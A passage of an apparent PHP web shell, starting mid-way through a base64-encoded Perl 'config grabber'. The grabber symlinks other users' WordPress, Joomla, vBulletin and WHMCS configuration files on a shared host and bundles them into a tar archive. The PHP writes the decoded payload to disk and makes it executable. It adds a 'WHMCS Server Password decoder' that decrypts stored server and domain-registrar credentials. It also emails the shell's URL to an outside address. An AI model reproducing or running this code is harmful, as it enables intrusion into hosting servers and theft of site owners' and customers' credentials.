cvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWVtYmVycy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1tZW1iZXJzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRrb2xhLictMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLWZvcnVtLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLWZvcnVtcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGtvbGEuJy01LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRrb2xhLictNC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLXdwLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL1dQL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AxMy1XUC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AxMy13cC1iZXRhLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLWJldGEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLXByZXNzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtd29yZHByZXNzLWJldGEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDEzLW5ldy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywka29sYS4nLXdwLWJsb2dzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cC1ob21lLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywka29sYS4nLXdwLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3Atc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywka29sYS4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FyY2FkZS9mdW5jdGlvbnMvZGJjbGFzcy5waHAnLCRrb2xhLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS1wcm90YWwudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvby50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS1zaXRlLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLW1haW4udHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLW5ldy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS1ob21lLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictdmIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictdmIzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NjL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictdmIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy1pbmNsdWRlcy12Yi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJGtvbGEuJy12Ymx1dHRpbn5jbGFzc19jb3JlLnBocC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9nbG9iYWwucGhwJywka29sYS4nLXZibHV0dGlufmdsb2JhbDEucGhwLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2dsb2JhbC5waHAnLCRrb2xhLictdmJsdXR0aW5+Z2xvYmFsMi5waHAudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2MvaW5jbHVkZXMvZ2xvYmFsLnBocCcsJGtvbGEuJy12Ymx1dHRpbn5nbG9iYWwzLnBocC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9pbml0LnBocCcsJGtvbGEuJy12Ymx1dHRpbn5pbml0LnBocC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htMTUudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2VudHJhbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9XSE1DUy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0tV0hNQ1MudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9XSE0vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htY3MudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1zdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHAvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictc3VjdXJlLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NlY3VyZS93aG0vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictc3VjdXJlLXdobS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jcGFuZWwudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictcGFuZWwudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictaG9zdGluZy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1ob3N0cy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGtvbGEuJy13aG1jczIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnRzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictY2xpZW50ZXMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictYmlsbGluZy50eHQnKTsgDQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobS1tYW5hZ2UudHh0Jyk7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL215L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobS1teXNob3AudHh0Jyk7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGtvbGEuJy16ZW5jYXJ0LnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC96ZW5jYXJ0L2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGtvbGEuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywka29sYS4nLXNob3AtWkNzaG9wLnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TZXR0aW5ncy5waHAnLCRrb2xhLictc21mLnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3MucGhwJywka29sYS4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGtvbGEuJy1zbWYtZm9ydW0udHh0Jyk7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtcy9TZXR0aW5ncy5waHAnLCRrb2xhLictc21mLWZvcnVtcy50eHQnKTsgDQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictdXAudHh0Jyk7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictdXAyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGtvbGEuJy02LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29sYS4nLTcudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29ubmVjdC5waHAnLCRrb2xhLictOC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJGtvbGEuJy05LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictdHJhaWRudDEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLnBocCcsJGtvbGEuJy00aW1hZ2VzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwJywka29sYS4nLURydXBhbC50eHQnKTsNCg0KfQ0KaWYgKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgJ1BPU1QnKSB7DQogIHJlYWQoU1RESU4sICRidWZmZXIsICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KfSBlbHNlIHsNCiAgJGJ1ZmZlciA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KfQ0KQHBhaXJzID0gc3BsaXQoLyYvLCAkYnVmZmVyKTsNCmZvcmVhY2ggJHBhaXIgKEBwYWlycykgew0KICAoJG5hbWUsICR2YWx1ZSkgPSBzcGxpdCgvPS8sICRwYWlyKTsNCiAgJG5hbWUgPX4gdHIvKy8gLzsNCiAgJG5hbWUgPX4gcy8lKFthLWZBLUYwLTldW2EtZkEtRjAtOV0pL3BhY2soIkMiLCBoZXgoJDEpKS9lZzsNCiAgJHZhbHVlID1+IHRyLysvIC87DQogICR2YWx1ZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkRk9STXskbmFtZX0gPSAkdmFsdWU7DQp9DQppZiAoJEZPUk17cGFzc30gZXEgIiIpew0KcHJpbnQgJw0KPGJvZHkgY2xhc3M9ImR6IiBiZ2NvbG9yPSIjM0Y3NEQ2Ij4NCjxwPiNEZXYgYnkgREFNQU5FMjAxMSB8IEV4dHJhY3RpbmcgQ29uZmlnICBWMSAyMDExICEhISBNb2RpZiFlZCB8IFsgPC9mb250PiA8Zm9udCBjb2xvcj0iYmxhY2siPlNjcmlwVCBFeHRyYWN0aW5nIENvbmZpZyAyMDExfiAhISA8L2ZvbnQ+XTwvcD4NCjxwPjxmb250IGNvbG9yPSIjQzBDMEMwIj5bPC9mb250PiA8Zm9udCBjb2xvcj0ieWVsbG93Ij5EeiBTZWN1cml0eSA8Zm9udCBjb2xvcj0id2hpdGUiPiY8L2ZvbnQ+IFByb2dyYW1taW5nIDxmb250IGNvbG9yPSJ3aGl0ZSI+ISE8L2ZvbnQ+IDxmb250IGNvbG9yPSIjQzBDMEMwIj5dPC9mb250PiANCjwvcD48c3Bhbj48Zm9udCBjb2xvcj0ieWVsbG93Ij5Vc2FnZTo8L2ZvbnQ+IFJlYWQgRmlsZSAhbiBTaDMxMSA9PiA8Zm9udCBjb2xvcj0iYmxhY2siPmNhdCAvZXRjL3Bhc3N3ZDwvZm9udD48L3NwYW4+PGJyIC8+DQo8YnIgLz48Zm9ybSBtZXRob2Q9InBvc3QiPjxzdHJvbmc+DQo8dGV4dGFyZWEgaWQ9ImNoZWNrb3V0dGV4dGFyZWEiIG5hbWU9InBhc3MiIHN0eWxlPSJib3JkZXI6MXB4IGRvdHRlZCAjMDBGRkZGOyB3aWR0aDogIDQ5OHB4OyBoZWlnaHQ6IDM3MHB4OyBiYWNrZ3JvdW5kLWNvbG9yOiNmZjAwZmY7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjlwdDsgY29sb3I6IGJsYWNrIiAgPjwvdGV4dGFyZWE+PGJyIC8+DQombmJzcDs8cD4NCjxpbnB1dCBuYW1lPSJ0YXIiIHR5cGU9InRleHQiIHN0eWxlPSJib3JkZXI6MXB4IGRvdHRlZCAjMDBGRkZGOyB3aWR0aDogMjEycHg7IGJhY2tncm91bmQtY29sb3I6I2ZmMDBmZjsgZm9udC1mYW1pbHk6VGFob21hOyBmb250LXNpemU6OHB0OyBjb2xvcjpibGFjazsgIiAgLz48YnIgLz4NCiZuYnNwOzwvcD4NCjxwPg0KPGlucHV0IG5hbWU9IlN1Ym1pdDEiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdldCBDb25maWciIHN0eWxlPSJib3JkZXI6MXB4IGRvdHRlZCAjMDBGRkZGOyB3aWR0aDogOTk7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjEwcHQ7IGNvbG9yOiBibGFjazsgdGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlOyBoZWlnaHQ6MjM7IGJhY2tncm91bmQtY29sb3I6I2ZmMDBmZjsiIC8+PC9wPg0KPC9mb3JtPjwvc3Ryb25nPg0KJzsNCn1lbHNlew0KQGxpbmVzID08JEZPUk17cGFzc30+Ow0KJHkgPSBAbGluZXM7DQpvcGVuIChNWUZJTEUsICI+dGFyLnRtcCIpOw0KcHJpbnQgTVlGSUxFICJ0YXIgLWN6ZiAiLiRGT1JNe3Rhcn0uIi50YXIgIjsNCmZvciAoJGthPTA7JGthPCR5OyRrYSsrKXsNCndoaWxlKEBsaW5lc1ska2FdICA9fiBtLyguKj8pOng6L2cpew0KJmxpbCgkMSk7DQpwcmludCBNWUZJTEUgJDEuIi50eHQgIjsNCmZvcigka2Q9MTska2Q8MTg7JGtkKyspew0KcHJpbnQgTVlGSUxFICQxLiRrZC4iLnR4dCAiOw0KfQ0KfQ0KIH0NCnByaW50Jzxib2R5IGNsYXNzPSJkeiIgYmdjb2xvcj0iIzNGNzRENiI+DQo8cD5Eb25lICEhPC9wPg0KPHA+Jm5ic3A7PC9wPic7DQppZigkRk9STXt0YXJ9IG5lICIiKXsNCm9wZW4oSU5GTywgInRhci50bXAiKTsNCkBsaW5lcyA9PElORk8+IDsNCmNsb3NlKElORk8pOw0Kc3lzdGVtKEBsaW5lcyk7DQpwcmludCc8cD48YSBocmVmPSInLiRGT1JNe3Rhcn0uJy50YXIiPjxmb250IGNvbG9yPSIjMDBGRjAwIj4NCjxzcGFuIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmUiPkNsaWNrIEhlcmUgVG8gRG93bmxvYWQgVGFyIEZpbGU8L3NwYW4+PC9mb250PjwvYT48L3A+JzsNCn0NCn0NCiBwcmludCINCjwvYm9keT4NCjwvaHRtbD4iOw0K';

$file = fopen("config.izo" ,"w+");
$write = fwrite ($file ,base64_decode($configshell));
fclose($file);
    chmod("config.izo",0755);
   echo "<iframe src=config/config.izo width=100% height=100% frameborder=0></iframe> ";
}
if ($act == "whm") {
function decrypt ($string,$cc_encryption_hash)
{

    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }

    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }

        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }

    return $out;
}


function _hash ($string)
{
    if (function_exists ('sha1'))
    {
        $hash = sha1 ($string);
    }
    else
    {
        $hash = md5 ($string);
    }

    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }

    return $out;
}

 if($_POST['form_action'] == 1 )
 {
 //include($file);

 $file=($_POST['file']);
$text=file_get_contents($file);

$text= str_replace("<?php", "", $text);
$text= str_replace("<?", "", $text);
$text= str_replace("?>", "", $text);

eval($text);

    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;

$query = mysql_query("SELECT * FROM tblservers");

while($v = mysql_fetch_array($query)) {

$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];

echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");


echo "</table><br><br></center>";

}

    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;

$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {

$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");





}
echo "</table><br><br></center>";
}



 if($_POST['form_action'] == 2 )
 {
include($file);

 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);

$to = "abdou2010new@hotmail.fr" ;
$subject = "Resseler" ;
$message = "Resseler : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['SCRIPT_NAME'] ;
mail ($to,$subject,$message) ;


    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;

$query = mysql_query("SELECT * FROM tblservers");

while($v = mysql_fetch_array($query)) {

$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];

echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");


echo "</table><br><br></center>";

}


    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;

$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {

$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");





}
echo "</table><br><br></center>";
}



?>
<body bgcolor="#000000">
 <style>

BODY { SCROLLBAR-BASE-COLOR: #191919; SCROLLBAR-ARROW-COLOR: olive;   color: white;}
textarea{background-color:#191919;color:red;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1px solid #666666;}
input{FONT-WEIGHT:normal;background-color: #191919;font-size: 13px;font-weight:bold;color: red; font-family: Tahoma; border: 1px solid #666666;height:17}
</style>
<center>
<font color="#FFFF6FF" size='+3'>[ ~~ WHMCS Server Password decoder ~~ ]</font><br><br>
